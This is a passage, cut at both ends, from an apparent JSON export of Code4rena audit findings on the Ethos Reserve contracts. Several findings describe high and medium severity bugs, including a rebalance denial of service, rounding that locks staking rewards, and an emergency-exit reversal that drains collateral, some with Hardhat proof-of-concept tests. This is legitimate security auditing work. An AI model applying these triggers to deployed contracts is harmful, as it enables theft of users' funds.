Used Manual Review  ## Recommended Mitigation Steps We should check 0 withdrawal in `_withdrawUnderlying()`.  ```solidity     function _withdrawUnderlying(uint256 _withdrawAmount) internal {         uint256 withdrawable = balanceOfPool();         _withdrawAmount = MathUpgradeable.min(_withdrawAmount, withdrawable);          if(_withdrawAmount != 0) {             ILendingPool(ADDRESSES_PROVIDER.getLendingPool()).withdraw(address(want), _withdrawAmount, address(this));         }     } ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/721", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-27"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/catellatech-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/720", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-30"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/brgltd-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/698", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-33"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/zzzitron-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/696", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-34"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/imare-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/688", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-35"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/ch0bu-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/677", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-28"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/peanuts-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/672", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "Q-37"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/GalloDaSballo-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/658", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-38"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/ast3ros-Q.md)."}, {"title": "Unchangeable owner of `ActivePool`", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/622", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-41"], "target": "2023-02-ethos-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/Dependencies/Ownable.sol#L17 https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/Dependencies/Ownable.sol#L26 https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L26   # Vulnerability details   ## Description  In the `ActivePool` contract there exist functions with `onlyOwner` access. The owner is defined in the contract constructor as `msg.sender`. It is unchangeable due to a lack of function that transfers ownership.  If the owner needs to change the address, they may face problems due to the absence of such functionality. For example, this may be necessary if the owner's account was initially set up with a certain EOA and then needs to be changed (for example, if certain employees who had access to the account need to have their access revoked because they are no longer members of the company).   ## Impact  Impossibility to change access to `onlyOwner` functions of the `ActivePool` contract.  ## Recommended Mitigation Steps  Add functionality similar to what is [implemented](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/7f028d69593342673492b0a0b1679e2a898cf1cf/contracts/access/Ownable.sol#L69) in the OpenZeppelin library `Ownable` contract. "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/617", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-43"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/lukris02-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/602", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-46"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/shark-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/599", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-47"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/CodeFoxInc-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/527", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-57"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/martin-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/513", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-59"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/0xackermann-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/496", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-61"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/ABA-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/491", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-62"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/Breeje-Q.md)."}, {"title": "Re-balancing the vault allocation may always revert when distributing profits : resulting of a massive system DOS  ", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/481", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-02-ethos-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L526-L538   # Vulnerability details  ## Description  **[updateRewardSum](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L486-L500)** function call **[_computeRewardsPerUnitStaked](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L493)** with **_debtToOffset** set to 0. Meaning that the assignment [L531](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L531) will revert if `lastLUSDLossError_Offset != 0` (which is likely the case) because we try to assign a negative value to an **uint**.  ## Impact  **[_rebalance()](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L239)** will be definitely DOS if the profit is greater than the **[yieldClainThreshold](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L252)** \u21d2 **[vars.profit != 0](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L286)**.  Because they call **_rebalance()** all these functions will be DOS :  In `BorrowerOperations` 100% DOS     - openTrove     - closeTrove     - _adjustTrove         - addColl, withdrawColl         - withdrawLUSD, repayLUSD In `TroveManager` 80% DOS     - liquidateTroves     - batchLiquidateTroves     - redeemCloseTrove  ## POC  Context : the vault has compound enough profit to withdraw. ([here](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L252))  Alice initiates a trove liquidation. **[offset()](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L466)** in `StabilityPool` is called to cancels out the trove debt against the LUSD contained in the Stability Pool.  A floor division errors occur so now **[lastLUSDLossError_Offset](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L537)** is not null.   Now, every time **[_rebalance()](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L305)** is called the transaction will revert.   ## Mitigation  In [StabilityPool.sol#L504-L544](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L504-L544), just skip the floor division errors calculation if `_debtToOffset == 0`   ```solidity if(_debtToOffset != 0){  [StabilityPool.sol#L526-L538](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L526-L538) } ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/472", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-39"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/matrix_0wl-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/471", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-63"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/0xnev-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/432", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-72"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/DadeKuma-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/409", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-73"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/0xSmartContract-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/387", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-74"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/emmac002-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/365", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-78"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/0xAgro-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/351", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-80"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/Rolezn-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/317", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-84"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/tnevler-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/310", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-85"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/Bnke0x0-Q.md)."}, {"title": "Rewards will be locked in LQTYStaking Contract", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/285", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-03"], "target": "2023-02-ethos-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/LQTY/LQTYStaking.sol#L181-L183 https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/RedemptionHelper.sol#L191-L197 https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/ActivePool.sol#L296-L300   # Vulnerability details  # Vulnerability details The state variable `F_Collateral` in the LQTYStaking contract is used to keep track of rewards for each of the collateral types used in the protocol. Every time the LQTYStaking contract is sent collateral assets for rewards by the ActivePool or the RedemptionHelper, `LQTYStaking.increaseF_Collateral` is called to record the rewards that are to be distributed to stakers.   However, if the state variable `totalLQTYStaked` is large enough in the LQTYStaking contract, zero rewards will be distributed to stakers even though LQTYStaking received assets. This issue is exarcebated when using WBTC as collateral due to its low number of decimals.   For example, given the following: 1. `totalLQTYStaked` = 1e25; LQTY/OATH token has 18 decimals; this means that a total of 10million LQTY has been staked 2. A redemption rate of 0.5% was applied on a redemption of 10e8 WBTC. This leads to a redemption fee of 5e6 WBTC that is sent to the LQTYStaking contract. This happens in [this code](https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/RedemptionHelper.sol#L190-L197).  3. Given the above, RedemptionHelper calls `LQTYStaking.increaseF_Collateral(WBTCaddress, 5e6)`  The issue is in this line in `increaseF_Collateral`: ```solidity if (totalLQTYStaked > 0) {collFeePerLQTYStaked = _collFee.mul(DECIMAL_PRECISION).div(totalLQTYStaked);} ```  `_collFee` = 5e6; `DECIMAL_PRECISION` = 1e18; `totalLQTYStaked` = 1e25  If we substitute the variables with the actual values and represent the code in math, it looks like: ``` (5e6 * 1e18) / 1e25 = 5e24 / 1e25 = 0.5 ```  Since the result of that math is a value less than 1 and in Solidity/EVM we only deal with integers and division rounds down, we get 0 as a result. That means the below code will only add `0` to `F_Collateral`: ```solidity F_Collateral[_collateral] = F_Collateral[_collateral].add(collFeePerLQTYStaked); ```  So even though LQTYStaking received 5e6 WBTC in redemption fee, that fee will never be distributed to stakers and will remain forever locked in the LQTYStaking contract. The minimum amount of redemption fee that is needed for the reward to be recognized and distributed to stakers is 1e7 WBTC. That means at least 0.1 BTC in collateral fee is needed for the rewards to be distributed when there is 1Million total LQTY staked.   ## Impact  This leads to loss of significant rewards for stakers. These collateral assets that are not distributed as rewards will remain forever locked in LQTYStaking.  If 1e25 LQTY is staked in LQTYStaking (10M LQTY), at least 1e7 (0.1) WBTC in redemption fee must be sent by the RedemptionHelper for that WBTC to be sent as rewards to the stakers. That means only redemptions of 20e8 (20) WBTC and more will lead to redemption fees high enough to be distributed as rewards to stakers. Redemption of 20e8 WBTC will rarely happen, so it's likely that majority of rewards will be forever locked since most redemptions will be less than that.  Given the above, if only 3% of redemptions have amounts of 20e8 WBTC or greater, then 97% of redemptions will have their fees forever locked in the contract. The greater the amount of LQTY Staked, the higher the amount needed for the fees to be recorded.   ## Proof of Concept  First, comment out [this line](https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/LQTY/LQTYStaking.sol#L178) in `increaseF_Collateral` to disable the access control. This allows us to write a more concise POC. It is fine since the issue has nothing to do with access control.  Add the following test case to the `Ethos-Core/test/LQTYStakingFeeRewardsTest.js` file after the `beforeEach` clause: ```js   it('does not increase F collateral even with large amount of collateral fee', async () => {     await stakingToken.mint(A, dec(10_000_000, 18))     await stakingToken.approve(lqtyStaking.address, dec(10_000_000, 18), {from: A})     await lqtyStaking.stake(dec(10_000_000, 18), {from: A})      const wbtc = collaterals[1].address     const oldWBTC_FCollateral = await lqtyStaking.F_Collateral(wbtc)      // .09 WBTC in redemption/collateral fee will not be distributed as reward to stakers     await lqtyStaking.increaseF_Collateral(wbtc, dec(9, 6))     assert.isTrue(oldWBTC_FCollateral.eq(await lqtyStaking.F_Collateral(wbtc)))          // at least 0.1 WBTC in redemption/collateral fee is needed for it to be distributed as reward to stakers     await lqtyStaking.increaseF_Collateral(wbtc, dec(1, 7))     assert.isTrue(oldWBTC_FCollateral.lt(await lqtyStaking.F_Collateral(wbtc)))   }) ```  The test can then be run with the following command: ``` $ npx hardhat test --grep \"does not increase F collateral even with large amount of collateral fee\" ```  ## Tools Used Manual review  ## Mitigation One way to address this issue is to use the same error-recording logic found in the `_computeLQTYPerUnitStaked` logic that looks like:  ```solidity         uint LQTYNumerator = _LQTYIssuance.mul(DECIMAL_PRECISION).add(lastLQTYError);          uint LQTYPerUnitStaked = LQTYNumerator.div(_totalLUSDDeposits);         lastLQTYError = LQTYNumerator.sub(LQTYPerUnitStaked.mul(_totalLUSDDeposits)); ```  The `lastLQTYError` state variable stores the LQTY issuance that was not distributed since they were just rounded off. The same approach can be used in `increaseF_Collateral`."}, {"title": "updateStrategyAllocBPS() can cause loss of ActivePool's collateral during an emergency exit", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/255", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-11"], "target": "2023-02-ethos-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultV2.sol#L191-L199 https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L123   # Vulnerability details     The function `updateStrategyAllocBPS()` can cause ActivePool to record an incorrect profit after `setEmergencyExit()` is triggered.   ## Impact The incorrect profit will cause a large portion of the ActivePool's collateral to be distributed to Treasury, Staking Pool and Stability Pool. Depositors and Stakers can then withdraw the profits, leading to loss of ActivePool's collateral.   ### Background In Ethos Reserve, the Vault rehypothecates the collateral from ActivePool using one or more Strategy, which will deposit the funds in other protocols (e.g. lending pool) to farm for yields.   Only Guardian and above roles are able to trigger `setEmergencyExit()` on a specific Strategy to force it to exit all its position upon the next harvest, depositing all funds from lending pool into the Vault. How it works, is that `setEmergencyExit()` will trigger Vault to `revokeStrategy()`, setting the strategy's `allocBPS` to `0`. This sets Strategy allocation to `0` and increases Strategy's debt, so that it will repay Vault all the funds. (see https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L156-L160)  Note that `setEmergencyExit()` is not reversible. I believe this is to protects funds from being re-deployed into the lending pool during an emergency situation (e.g. lending pool hacked or market crash). And it is different from Vault's EmergencyShutdown, which is effected on all Strategies and is reversible.  ### Detailed Explanation The issue is that, Strategist (a lower privilege role than Guardian) is able to reverse `revokeStrategy()` by calling `updateStrategyAllocBPS()` with a non-zero value to increase the strategy allocation. This will lead to a reduction of the strategy's debt and cause an incorrect profit to be recorded when it liquidate its positions in the next harvest. Due to the incorrect profit, a fee will be charged on it and transferred to Treasury, leaving less funds for the Vault.   https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultV2.sol#L191-L199   https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L123  Even worse, `updateStrategyAllocBPS()` will cause an increase to vault's totalAllocated value during `harvest()`, while the incorrect profit is transferred to the Vault during harvest. Both of these changes will lead to a discrepancy in the vault's `totalAllocated` and its token balance, causing the vault's total balance to be incorrect and higher than actual. This leads to a higher share price.   https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultV2.sol#L521  https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultV2.sol#L528  With a higher share price, ActivePool's owned asset value in the Vault will be inflated. This will cause ActivePool to record an incorrect profit in the next  `_rebalance()`,  and distrbute them to Treasury, Staking Pool and Stability Pool.   https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/ActivePool.sol#L239-L309  Depositors and Stakers can then withdraw the profits, leading to loss of ActivePool's collateral.   ## Proof of Concept  Add the following test case to `Ethos-Vault/test/start-test.js`. This shows that ActivePool's asset value will be inflated due to the issue. The next test case will show that inflated asset value will cause ActivePool's `_rebalance()` to record a profit and distribute them to the respective pools, that can be withdrawn.      it.only('updateStrategyAllocBPS can cause loss of ActivePool collateral during emergency exit', async function () {       const {vault, strategy, want, wantHolder, strategyAddress, strategist, guardian} =          await loadFixture(deployVaultAndStrategyAndGetSigners);       // intialize guardian account with ETH for gas       const tx = await strategist.sendTransaction({         to: guardianAddress,         value: ethers.utils.parseEther('0.1'),       });       await tx.wait();        // Treasury owned asset value starts with zero       const treasurySharesBefore = await vault.balanceOf(treasuryAddr);       const treasuryAssetsBefore = await vault.convertToAssets(treasurySharesBefore);       expect(treasuryAssetsBefore).to.equal(0);        // ActivePool deposits 10 WBTC        await vault.connect(wantHolder)['deposit(uint256)'](toWantUnit('10'));       await strategy.harvest();             // Expect ActivePool's owned share and asset to be equal to 10 WBTC as deposited       const activePoolSharesBefore = await vault.balanceOf(wantHolder.address);       const activePoolAssetsBefore = await vault.convertToAssets(activePoolSharesBefore);       expect(activePoolSharesBefore).to.equal(toWantUnit('10'));       expect(activePoolAssetsBefore).to.equal(toWantUnit('10'));        /* Guardian calls setEmergencyExit().       *  This triggers Vault to revokeStrategy() and set strategy's allocBPS to 0.       *  By design, this will force strategy to exit all its position and        *  return funds to vault in the next harvest().       */       await strategy.connect(guardian).setEmergencyExit();        /* Strategist set AllocBPS back to 10000 (100%).        *  This will reverse the revokeStrategy() and cause strategy's debt value        *  to be reduced in next harvest()       */       await vault.connect(strategist).updateStrategyAllocBPS(strategy.address, 10000);        /* Strategy will liquidate all its position due to emergency exit state.       * However, it will also record an incorrect profit due to reduced debt value.       */       await strategy.harvest();        // Jump ahead for incorrect profit to unlock       await moveTimeForward(3600*7);        // Treasury will gain fees of 1.56 WBTC on the incorrect profit value       const treasurySharesAfter = await vault.balanceOf(treasuryAddr);       const treasuryAssetsAfter = await vault.convertToAssets(treasurySharesAfter);       expect(treasuryAssetsAfter).to.not.equal(treasuryAssetsBefore);       expect(treasuryAssetsAfter).to.equal(156880733);        // ActivePool's owned asset value is incorrectly inflated        // This is due to increased share price from the incorrect profit and wrong accounting from allocBPS       const activePoolSharesAfter = await vault.balanceOf(wantHolder.address);       const activePoolAssetsAfter = await vault.convertToAssets(activePoolSharesAfter);       expect(activePoolAssetsAfter).to.equal(\"1743119266\");       expect(activePoolAssetsAfter).to.not.equal(activePoolAssetsBefore);        /* ActivePool will record a profit of 7.43 WBTC (74% of initial deposit) due to the inflated asset value       *  In the next ActivePool's _rebalance(), the  incorrect profit will be distributed to Treasury,        *  Staking Pool and StabilityPool.        *  Depositors and Stakers will be able to withdraw the profits, leading to loss of borrowers's collateral.       */       const estimatedActivePoolProfit = activePoolAssetsAfter - activePoolAssetsBefore;       expect(estimatedActivePoolProfit).to.be.equal(743119266);      });   Add the following test case to `Ethos-Core/test/PoolsTest.js`. Note that this is an  test independent from the preivous test case just to show that ActivePool will record a profit when the share asset value increases, and the profit will be distributed to the respective pools.   it.only('simulate incorrect profit to show that _rebalance() called by sendCollateral() will distributes profit', async () => {   await setReasonableDefaultStateForYielding();    // Simulate incorrect profit: mint 1 ether to vault.     // This will increase the vault share price and inflate the ActivePool's owned asset value.   await collaterals[0].mint(vaults[0].address, dec(1, 'ether'))    // Trigger ActivePool's _rebalance() via sendCollateral().    // ActivePool will record a profit due to the inflated owned asset value.   const sendCollData = th.getTransactionData('sendCollateral(address,address,uint256)',      [collaterals[0].address, alice, web3.utils.toHex(dec(1, 'ether'))])   await mockBorrowerOperations.forward(activePool.address, sendCollData, { from: owner })    // The incorrect profit will be distributed to Treasury, StabilityPool and Staking Pool   assert.equal((await collaterals[0].balanceOf(treasury.address)).toString(), '200000000000000000') // 0.2 ether   assert.equal((await collaterals[0].balanceOf(stabilityPool.address)).toString(), '300000000000000000') // 0.3 ether   assert.equal((await collaterals[0].balanceOf(lqtyStaking.address)).toString(), '500000000000000000') // 0.5 ether  })  ## Recommended Mitigation Steps The fix is to block all changes to strategy's `allocBPS` after `setEmergencyExit()`.   Since `allocBPS` is already tracked within `ReaperVaultV2.sol`, it is better to refactor and shift `emergencyExit` from `ReaperBaseStrategyv4.sol` to `ReaperVaultV2.StrategyParams`. With that, the fix can simply just to add a check for emergency exit within `updateStrategyAllocBPS()`.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/251", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-91"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/btk-Q.md)."}, {"title": "ReaperVaultERC4626 is not EIP-4626 compliant and integrations can result in loss of funds", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/247", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-12"], "target": "2023-02-ethos-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultV2.sol#L368-L408   # Vulnerability details  ## Impact Contracts that integrate with the `ReaperVaultERC4626` vault (including Ethos contracts) may wrongly assume that the functions are EIP-4626 compliant, which it might cause integration problems in the future, that can lead to a wide range of issues for both parties, including loss of funds.  ## Proof of Concept  This PoC describes this issue for the `withdraw` function, but there is the same problem with the `redeem` function.  EIP-4626 specification says that the `withdraw` function:  ``` // Burns shares from owner and sends exactly assets of underlying tokens to receiver.  // MUST revert if all of assets cannot be withdrawn (due to withdrawal limit being reached, slippage, // the owner not having enough shares, etc). ```  This is the `withdraw` function:  ```solidity File: Ethos-Vault\\contracts\\ReaperVaultERC4626.sol  202:     function withdraw( 203:         uint256 assets, 204:         address receiver, 205:         address owner 206:     ) external override returns (uint256 shares) { 207:         shares = previewWithdraw(assets); // previewWithdraw() rounds up so exactly \"assets\" are withdrawn and not 1 wei less 208:         if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares); 209:         _withdraw(shares, receiver, owner); 210:     } ```  When the internal `_withdraw` is called, the `value` represents the total amount of assets that will be transferred to the receiver.  There is a special case where there could be a withdrawal that exceeds the total balance of the vault:  ```solidity File: Ethos-Vault\\contracts\\ReaperVaultV2.sol  368:         if (value > token.balanceOf(address(this))) { 369:             uint256 totalLoss = 0; 370:             uint256 queueLength = withdrawalQueue.length; 371:             uint256 vaultBalance = 0; 372:             for (uint256 i = 0; i < queueLength; i = i.uncheckedInc()) { 373:                 vaultBalance = token.balanceOf(address(this)); 374:                 if (value <= vaultBalance) { 375:                     break; 376:                 } 377:  378:                 address stratAddr = withdrawalQueue[i]; 379:                 uint256 strategyBal = strategies[stratAddr].allocated; 380:                 if (strategyBal == 0) { 381:                     continue; 382:                 } 383:  384:                 uint256 remaining = value - vaultBalance; 385:                 uint256 loss = IStrategy(stratAddr).withdraw(Math.min(remaining, strategyBal)); 386:                 uint256 actualWithdrawn = token.balanceOf(address(this)) - vaultBalance; 387:  388:                 // Withdrawer incurs any losses from withdrawing as reported by strat 389:                 if (loss != 0) { 390:                     value -= loss; 391:                     totalLoss += loss; 392:                     _reportLoss(stratAddr, loss); 393:                 } 394:  395:                 strategies[stratAddr].allocated -= actualWithdrawn; 396:                 totalAllocated -= actualWithdrawn; 397:             } 398:  399:             vaultBalance = token.balanceOf(address(this)); 400:             if (value > vaultBalance) { 401:                 value = vaultBalance; 402:             } 403:  404:             require( 405:                 totalLoss <= ((value + totalLoss) * withdrawMaxLoss) / PERCENT_DIVISOR, 406:                 \"Withdraw loss exceeds slippage\" 407:             ); 408:         } 409:  410:         token.safeTransfer(_receiver, value); ``` In this case, if a strategy incurs any losses, the actual withdrawal amount will NOT be the exact same specified when calling the `withdraw` function, as it will be less than that, as **the loss is detracted from the withdrawn value**:  ```solidity File: Ethos-Vault\\contracts\\ReaperVaultV2.sol  388:                 // Withdrawer incurs any losses from withdrawing as reported by strat 389:                 if (loss != 0) { 390:                     value -= loss; 391:                     totalLoss += loss; 392:                     _reportLoss(stratAddr, loss); 393:                 } ``` If that happens, then `assets requested > assets received`.  As the specification says that the withdrawal 